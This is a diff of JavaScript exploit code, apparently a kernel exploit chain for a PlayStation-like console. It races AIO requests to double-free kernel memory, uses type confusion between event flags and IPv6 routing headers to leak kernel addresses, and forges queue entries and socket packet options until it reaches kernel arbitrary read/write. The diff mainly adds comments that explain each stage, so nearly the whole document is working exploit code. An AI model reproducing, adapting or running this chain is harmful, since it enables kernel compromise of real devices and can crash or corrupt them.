@@ -1,12 +1,11 @@
 //#region Variables
 const NUM_REQS = 3; // 0x80 kmalloc zone since SceKernelAioRWRequest.sizeof * 3 = 0x78
 const WORKER_NUM = 2;
-const SPRAY_NUM = 0x300;
-const ATTEMPT_NUM = 0x80; 
+const SPRAY_NUM = 0x200;
+const ATTEMPT_NUM = 0x80;
 const HANDLES_NUM = 0x100;
 const IPV6_SOCK_NUM = 0x80;
 //#endregion
-
 //#region Contants
 const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
 
@@ -61,7 +60,6 @@ fn.aio_multi_poll = new NativeFunction(0x298, "number");
 fn.aio_multi_cancel = new NativeFunction(0x29a, "number");
 fn.aio_submit_cmd = new NativeFunction(0x29d, "number");
 //#endregion
-
 //#region Functions
 function build_reqs1(count, fd = -1) {
   mem.bset(reqs1.addr, SceKernelAioRWRequest.sizeof * AIO_MAX_NUM);
@@ -118,6 +116,7 @@ function process_aio(op, ids, offset = 0, count = ids.length - offset) {
 async function spawn_race_worker() {
   logger.debug("spawn race worker...");
 
+  // Prepare worker
   race_worker = new RPCWorker(`race_worker`);
   await race_worker.init();
   await race_worker.execute(
@@ -173,14 +172,19 @@ function stop_race_worker() {
 }
 
 function verify_reqs2(aio_entry) {
+  // heap addresses are prefixed with 0xffff_xxxx
+  // xxxx is randomized on boot
+  //
+  // heap_prefixes is a array of randomized prefix bits from a group of heap
+  // address candidates. if the candidates truly are from the heap, they must
+  // share a common prefix
   const heap_prefixes = [];
   const verify_prefix = (v) => {
     if (v.shr(0x30).neq(0xffff)) {
-      return false;
+      throw new Error(`${v} not a kernel pointer !!`);
     }
 
     heap_prefixes.push(v.shr(0x20).and(0xffff));
-    return true;
   };
 
   try {
@@ -188,10 +192,13 @@ function verify_reqs2(aio_entry) {
       return false;
     }
 
-    if (!verify_prefix(aio_entry.ar2_reqs1)) return false;
-    if (!verify_prefix(aio_entry.ar2_info)) return false;
-    if (!verify_prefix(aio_entry.ar2_batch)) return false;
+    verify_prefix(aio_entry.ar2_reqs1);
+    verify_prefix(aio_entry.ar2_info);
+    verify_prefix(aio_entry.ar2_batch);
 
+    // check reqs2.ar2_result.state
+    // state is actually a 32-bit value but the allocated memory was
+    // initialized with zeros. all padding bytes must be 0 then
     if (aio_entry.ar2_result.state <= 0 || aio_entry.ar2_result.state > AIO_STATE_ABORTED) {
       return false;
     }
@@ -200,15 +207,18 @@ function verify_reqs2(aio_entry) {
       return false;
     }
 
+    // reqs2.ar2_file must be NULL since we passed a bad file descriptor to
+    // aio_submit_cmd()
     if (aio_entry.ar2_file.neq(0)) {
       return false;
     }
 
+    // aio_entry._unk2 can be NULL
     if (aio_entry._unk2.neq(0)) {
-      if (!verify_prefix(aio_entry._unk2)) return false;
+      verify_prefix(aio_entry._unk2);
     }
 
-    if (!verify_prefix(aio_entry.ar2_qentry)) return false;
+    verify_prefix(aio_entry.ar2_qentry);
 
     return heap_prefixes.every((v, _, a) => v.eq(a[0]));
   } catch {
@@ -219,7 +229,7 @@ function verify_reqs2(aio_entry) {
 function find_rthdr_twins() {
   for (let i = 0; i < ATTEMPT_NUM; i++) {
     for (let i = 0; i < ipv6_socks.length; i++) {
-      arw.view(spray_rthdr0_addr).setInt32(4, i, true);
+      arw.view(spray_rthdr0_addr).setInt32(4, i, true); // ip6_rthdr0.ip6r0_reserved
 
       set_rthdr(ipv6_socks[i]);
     }
@@ -227,7 +237,7 @@ function find_rthdr_twins() {
     for (let j = 0; j < ipv6_socks.length; j++) {
       get_rthdr(ipv6_socks[j], ip6_rthdr0.sizeof);
 
-      const idx = arw.view(leak_rthdr0_addr).getInt32(4, true);
+      const idx = arw.view(leak_rthdr0_addr).getInt32(4, true); // ip6_rthdr0.ip6r0_reserved
       if (idx !== j) {
         logger.debug(`Found rthdr twins after ${i} iterations !!`);
 
@@ -237,13 +247,16 @@ function find_rthdr_twins() {
         const max = Math.max(j, idx);
         const min = Math.min(j, idx);
 
+        // remove twins from list
         ipv6_socks.splice(max, 1);
         ipv6_socks.splice(min, 1);
 
+        // free rthdr from rest of sockets
         for (const sock of ipv6_socks) {
           free_rthdr(sock);
         }
 
+        // replace twins with new sockets
         ipv6_socks.push(make_socket(AF_INET6, SOCK_DGRAM), make_socket(AF_INET6, SOCK_DGRAM));
 
         return;
@@ -289,9 +302,12 @@ function make_pktopts_twins() {
         const max = Math.max(j, idx);
         const min = Math.min(j, idx);
 
+        // remove twins from list
         ipv6_socks.splice(max, 1);
         ipv6_socks.splice(min, 1);
 
+        // replace twins with new sockets, and add pktopts now while new allocs can't
+        // use the double freed memory
         for (let k = 0; k < pktopts_twins.length; k++) {
           const sock = make_socket(AF_INET6, SOCK_DGRAM);
 
@@ -327,11 +343,13 @@ function init() {
   pin_to_core(MAIN_CORE);
   set_rtprio(RTP);
 
+  // Prepare spray/leak rthdr0
   spray_rthdr0_addr = mem.alloc(0x100);
   spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, 0x80);
 
   leak_rthdr0_addr = mem.alloc(0x800);
 
+  // Prepare reqs
   const aio_rw_req_buf = mem.alloc(SceKernelAioRWRequest.sizeof * AIO_MAX_NUM);
   reqs1 = SceKernelAioRWRequest.new(aio_rw_req_buf);
 
@@ -339,6 +357,7 @@ function init() {
 
   const pair_addr = mem.alloc(8);
 
+  // Create socket pair
   if (fn.socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr) === -1) {
     throw new SyscallError("Unable to create socket pair !!");
   }
@@ -350,6 +369,7 @@ function init() {
 
   mem.free(pair_addr);
 
+  // Setup sockets for spraying and initialize pktopts
   for (let i = 0; i < ipv6_socks.length; i++) {
     ipv6_socks[i] = make_socket(AF_INET6, SOCK_DGRAM);
   }
@@ -449,8 +469,8 @@ async function setup() {
 async function double_free_reqs2() {
   const server_addr = sockaddr_in.new();
   server_addr.sin_family = AF_INET;
-  server_addr.sin_port = 0x8d13;
-  server_addr.sin_addr = 0x0100007f;
+  server_addr.sin_port = 0x8d13; // 5005
+  server_addr.sin_addr = 0x0100007f; // 127.0.0.1
 
   const server_sock = make_socket(AF_INET, SOCK_STREAM);
   logger.debug(`server_sock: ${server_sock}`);
@@ -501,6 +521,7 @@ async function double_free_reqs2() {
       throw new SyscallError(`Unable to accept socket ${server_sock} !!`);
     }
 
+    // force soclose() to sleep
     if (fn.setsockopt.invoke(client_sock, SOL_SOCKET, SO_LINGER, client_linger.addr, linger.sizeof) === -1) {
       throw new SyscallError(`Unable to set socket option for fd ${client_sock} !!`);
     }
@@ -512,6 +533,7 @@ async function double_free_reqs2() {
 
     logger.debug(`aio_ids: ${Array.from(aio_ids).map((v) => v.hex())}`);
 
+    // drop the reference so that aio_multi_delete() will trigger _fdrop()
     if (fn.close.invoke(client_sock) === -1) {
       throw new SyscallError(`Unable to close fd ${client_sock} !!`);
     }
@@ -538,6 +560,8 @@ async function double_free_reqs2() {
     mem.free(info_size_addr);
 
     if (outs[0] !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
+      // PANIC: double free on the 0x80 malloc zone. important kernel
+      // data may alias
       process_aio(AIO_OP_DELETE, aio_ids, which_req);
       won_race = true;
     }
@@ -550,9 +574,13 @@ async function double_free_reqs2() {
       const race_errs = outs.slice(0, 2);
       logger.debug(`race_errs: ${Array.from(race_errs).map((v) => v.hex())}`);
 
+      // if the code has no bugs then this isn't possible but we keep the
+      // check for easier debugging
       if (race_errs.every((v) => v === 0)) {
         logger.info("Looking for rthdr twins...");
 
+        // RESTORE: double freed memory has been reclaimed with harmless data
+        // PANIC: 0x80 malloc zone pointers aliased
         find_rthdr_twins();
 
         logger.info(`Found rthdr twins: ${rthdr_twins} !!`);
@@ -567,6 +595,8 @@ async function double_free_reqs2() {
       won_race = verify_won_race;
     }
 
+    // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
+    // twice. this will leave one request undeleted
     process_aio(AIO_OP_DELETE, aio_ids);
 
     if (fn.close.invoke(connected_sock) === -1) {
@@ -599,6 +629,8 @@ function leak_kaddrs() {
     throw new SyscallError(`Unable to close fd ${rthdr_twins[1]} !!`);
   }
 
+  // type confuse a struct evf with a struct ip6_rthdr. the flags of the evf
+  // must be set to >= 0xf00 in order to fully leak the contents of the rthdr
   let leaked = false;
   for (let i = 0; i < ATTEMPT_NUM; i++) {
     const evfs = new Array(HANDLES_NUM);
@@ -651,20 +683,39 @@ function leak_kaddrs() {
     logger.debug(`evf[${i}]: ${arw.view(leak_rthdr0_addr).getBInt(i * 8, true)}`);
   }
 
+  // fields we use from evf:
+  //   struct evf:
+  //     0 u64 flags
+  //     0x28 struct cv cv
+  //     0x38 TAILQ_HEAD(struct evf_waiter) waiters
+  //
+  // evf.cv.cv_description = "evf cv"
+  // string is located at the kernel's mapped ELF file
   evf_cv_addr = arw.view(leak_rthdr0_addr).getBInt(0x28, true);
   logger.debug(`evf_cv_addr: ${evf_cv_addr}`);
 
+  // because of TAILQ_INIT(), we have:
+  //
+  // evf.waiters.tqh_last == &evf.waiters.tqh_first
+  //
+  // we now know the address of the kernel buffer we are leaking
   reqs2_addr = arw.view(leak_rthdr0_addr).getBInt(0x40, true).sub(0x38);
   logger.debug(`reqs2_addr: ${reqs2_addr}`);
 
+  // ip6_rthdr0 and evf obj are overlapped by now
+  // corrupt ip6r0_len to leak (0xFF + 1) * 8 bytes [0x800] by setting the evf's flag
   fn.evf_clear.invoke(evf, 0);
   fn.evf_set.invoke(evf, 0xff << 8);
 
+  // allocate reqs1 arrays at 0x100 kmalloc zone since SceKernelAioRWRequest.sizeof * 6 = 0xF0
   const num_reqs = 6;
   const leak_ids = new Uint32Array(HANDLES_NUM * num_reqs);
 
   build_reqs1(num_reqs);
 
+  // use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
+  // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
+  // field
   reqs1.buf = reqs2_addr.add(4);
 
   logger.info("leak reqs2 started...");
@@ -676,6 +727,7 @@ function leak_kaddrs() {
   for (let i = 0; i < ATTEMPT_NUM; i++) {
     spray_aio(AIO_CMD_WRITE | AIO_CMD_MULTI, num_reqs, leak_ids);
 
+    // out of bound read on adjacent malloc 0x80 memory
     get_rthdr(rthdr_twins[0], 0x800);
 
     for (let j = 1; j < 0x10; j++) {
@@ -706,9 +758,11 @@ function leak_kaddrs() {
     logger.debug(`reqs2[${i}]: ${arw.view(reqs2.addr).getBInt(i * 8, true)}`);
   }
 
+  // reqs1 is allocated from malloc 0x100 zone, so it must be aligned at 0xff..xx00
   reqs1_addr = reqs2.ar2_reqs1.and(new BInt(0xff).not());
   logger.debug(`reqs1_addr: ${reqs1_addr}`);
 
+  // store for curproc leak later
   aio_info_addr = reqs2.ar2_info;
   logger.debug(`aio_info_addr: ${aio_info_addr}`);
 
@@ -719,6 +773,7 @@ function leak_kaddrs() {
   for (let batch = 0; batch < leak_ids.length; batch += num_reqs) {
     process_aio(AIO_OP_CANCEL, leak_ids, batch, num_reqs);
 
+    // out of bound read on adjacent malloc 0x80 memory
     get_rthdr(rthdr_twins[0], 0x800);
 
     if (reqs2.ar2_result.state === AIO_STATE_ABORTED) {
@@ -787,23 +842,35 @@ function double_free_reqs1() {
 
   logger.info("Craft AIO queue entry started...");
 
+  // craft a aio_batch using the end portion of the buffer
   const reqs3_offset = 0x28;
   const spray_reqs3_addr = spray_rthdr0_addr.add(reqs3_offset);
   const leak_reqs3_addr = leak_rthdr0_addr.add(reqs3_offset);
 
+  // overlap crafted reqs3 (aio_batch) with reqs2 (aio_entry)
   const spray_aio_entry = aio_entry.new(spray_rthdr0_addr);
 
   spray_aio_entry.ar2_ticket = 5;
   spray_aio_entry.ar2_info = reqs1_addr;
-  spray_aio_entry.ar2_batch = reqs2_addr.add(reqs3_offset);
+  spray_aio_entry.ar2_batch = reqs2_addr.add(reqs3_offset); // reqs3 offset
 
+  // use reqs1 to fake a aio_batch at offset 0x28.
   const spray_aio_batch = aio_batch.new(spray_reqs3_addr);
 
   spray_aio_batch.ar3_num_reqs = 1;
   spray_aio_batch.ar3_reqs_left = 0;
   spray_aio_batch.ar3_state = AIO_STATE_COMPLETE;
   spray_aio_batch.ar3_done = 0;
+
+  // .ar3_lock.lock_object.lo_flags = (
+  //     LO_SLEEPABLE | LO_UPGRADABLE
+  //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
+  //     | 6 << LO_CLASSSHIFT
+  //     | LO_INITIALIZED
+  // )
   spray_aio_batch.lock_object_flags = 0x67b0000;
+
+  // .ar3_lock.lk_lock = LK_UNLOCKED
   spray_aio_batch.lock_object_lock = 1;
 
   logger.info("Crafted AIO queue entry !!");
@@ -841,6 +908,7 @@ function double_free_reqs1() {
         req_id = aio_ids[aio_req_idx];
         logger.debug(`req_id: ${req_id.hex()}`);
 
+        // set .ar3_done to 1
         process_aio(AIO_OP_POLL, aio_ids, aio_req_idx, 1);
 
         logger.debug(`states[${req_idx}]: ${outs[0].hex()}`);
@@ -858,12 +926,15 @@ function double_free_reqs1() {
             rthdr_twins[0] = ipv6_socks[k];
             logger.debug(`dirty_fd: ${rthdr_twins[0]}`);
 
+            // remove dirty from list
             ipv6_socks.splice(k, 1);
 
+            // free rthdr from rest of sockets
             for (let i = 0; i < ipv6_socks.length;i++) {
               free_rthdr(ipv6_socks[i]);
             }
 
+            // replace dirty with new sockets
             ipv6_socks.push(make_socket(AF_INET6, SOCK_DGRAM));
 
             break;
@@ -887,23 +958,39 @@ function double_free_reqs1() {
 
   const target_ids = new Uint32Array([req_id, target_id]);
 
+  // enable deletion of target_ids
   process_aio(AIO_OP_POLL, target_ids, 1);
 
   const status = outs.slice(0, 2);
   logger.debug(`target status: ${Array.from(status).map((v) => v.hex())}`);
 
+  // double free on malloc 0x100 by:
+  //   - freeing target_id's aio_object->reqs1
+  //   - freeing req_id's aio_object->aio_entries[x]->ar2_info
+  //   - ar2_info points to same addr as target_id's aio_object->reqs1
+  //
+  // PANIC: double free on the 0x100 malloc zone. important kernel data may alias
   process_aio(AIO_OP_DELETE, target_ids);
 
+  // we reclaim first since the sanity checking here is longer which makes it
+  // more likely that we have another process claim the memory
   try {
     logger.info("Make pktopts twins...");
+
+    // RESTORE: double freed memory has been reclaimed with harmless data
+    // PANIC: 0x100 malloc zone pointers aliased
     make_pktopts_twins();
+
     logger.info(`Made pktopts twins: ${pktopts_twins} !!`);
   } finally {
     const errs = outs.slice(0, 2);
+
     logger.debug(`delete errors: ${Array.from(errs).map((v) => v.hex())}`);
 
     process_aio(AIO_OP_POLL, target_ids);
+
     const status = outs.slice(0, 2);
+
     logger.debug(`target status: ${Array.from(status).map((v) => v.hex())}`);
 
     if (status[0] !== SCE_KERNEL_ERROR_ESRCH) {
@@ -925,7 +1012,7 @@ function make_karw() {
   const ip6po_pktinfo_addr = reqs1_addr.add(0x10);
   logger.debug(`ip6po_pktinfo_addr: ${ip6po_pktinfo_addr}`);
 
-  arw.view(spray_rthdr0_addr).setBInt(0x10, ip6po_pktinfo_addr, true);
+  arw.view(spray_rthdr0_addr).setBInt(0x10, ip6po_pktinfo_addr, true); // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
 
   logger.info(`Overwrite ${pktopts_twins[0]} pktopts started...`);
 
@@ -939,6 +1026,9 @@ function make_karw() {
   let overwritten = false;
   for (let i = 0; i < ATTEMPT_NUM; i++) {
     for (let i = 0; i < ipv6_socks.length; i++) {
+      // if a socket doesn't have a pktopts, setting the rthdr will make
+      // one. the new pktopts might reuse the memory instead of the
+      // rthdr. make sure the sockets already have a pktopts before
       arw.view(spray_rthdr0_addr).setUint32(0xb0, (i << 0x10) | 0x1337, true);
       set_rthdr(ipv6_socks[i]);
     }
@@ -983,11 +1073,11 @@ function make_karw() {
       throw new Error("Empty addr !!");
     }
 
-    arw.view(pktinfo_addr).setBInt(0, ip6po_pktinfo_addr, true);
+    arw.view(pktinfo_addr).setBInt(0, ip6po_pktinfo_addr, true); // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
 
     let offset = 0;
     while (offset < 8) {
-      arw.view(pktinfo_addr).setBInt(8, addr.add(offset), true);
+      arw.view(pktinfo_addr).setBInt(8, addr.add(offset), true); // pktopts.ip6po_nexthop = addr + offset
 
       if (fn.setsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14) === -1) {
         throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);
@@ -1060,16 +1150,16 @@ function make_karw() {
 
   mem.bset(pktinfo_addr, 0x14);
 
-  arw.view(pktinfo_addr).setBInt(0, master_pipe_f_data.add(8), true);
-  arw.view(pktinfo_addr).setBInt(8, 0, true);
+  arw.view(pktinfo_addr).setBInt(0, master_pipe_f_data.add(8), true); // pktopts.ip6po_pktinfo = &((pipe *)master_pipe_fp->f_data)->pipe_buffer.out
+  arw.view(pktinfo_addr).setBInt(8, 0, true); // pktopts.ip6po_nexthop = 0
 
   if (fn.setsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14) === -1) {
     throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);
   }
 
-  arw.view(pktinfo_addr).setUint32(0, 0, true);
-  arw.view(pktinfo_addr).setUint32(4, PAGE_SIZE, true);
-  arw.view(pktinfo_addr).setBInt(8, slave_pipe_f_data, true);
+  arw.view(pktinfo_addr).setUint32(0, 0, true); // pipebuf.out
+  arw.view(pktinfo_addr).setUint32(4, PAGE_SIZE, true); // pipebuf.size
+  arw.view(pktinfo_addr).setBInt(8, slave_pipe_f_data, true); // pipebuf.buffer
 
   if (fn.setsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14) === -1) {
     throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);
@@ -1080,7 +1170,6 @@ function make_karw() {
   logger.info("Achieved kernel ARW !!");
 }
 //#endregion
-
 //#region Structs
 const linger = new Struct("linger", [
   { type: "Int32", name: "l_onoff" },
